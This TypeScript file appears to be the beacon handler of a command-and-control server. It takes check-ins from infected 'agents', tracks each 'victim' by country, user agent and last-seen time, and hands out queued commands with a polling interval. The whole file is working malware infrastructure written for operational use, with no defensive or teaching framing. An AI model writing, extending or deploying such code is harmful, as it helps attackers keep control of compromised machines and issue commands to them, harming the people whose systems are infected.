import { json, error } from "../core/response"
import { rateLimit } from "../core/rateLimit"
import { getVictim, upsertVictim } from "../storage/victims"
import {
  getCommand,
  deleteCommand
} from "../storage/commands"
import { Victim } from "../types/victim"

export async function beacon(
  request: Request,
  env: Env
): Promise<Response> {

  if (request.method !== "POST") {
    return error("Method Not Allowed", 405)
  }

  let body: { id?: string }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (!body.id || typeof body.id !== "string") {
    return error("Invalid agent id", 400)
  }

  // ✅ rate limit (agent-based, proven)
  const allowed = await rateLimit(
    env.C2_STORAGE,
    `agent:${body.id}`
  )

  if (!allowed) {
    return error("Too Many Requests", 429)
  }

  // ---- victim tracking ----
  const now = new Date().toISOString()

  const existing = await getVictim(env.C2_STORAGE, body.id)

  const victim: Victim = existing ?? {
    id: body.id,
    firstSeen: now,
    lastSeen: now,
    country: request.headers.get("CF-IPCountry") || "unknown",
    userAgent: request.headers.get("User-Agent") || "unknown",
    status: "online"
  }

  victim.lastSeen = now
  victim.status = "online"

  await upsertVictim(env.C2_STORAGE, victim)

  // ---- command consumption (STEP 4) ----
  const cmd = await getCommand(env.C2_STORAGE, body.id)

  if (cmd) {
    // atomic enough for KV (single agent)
    await deleteCommand(env.C2_STORAGE, body.id)

    return json({
      command: cmd.command,
      commandId: cmd.id,
      interval: 60
    })
  }

  // no command
  return json({
    command: null,
    interval: 60
  })
}
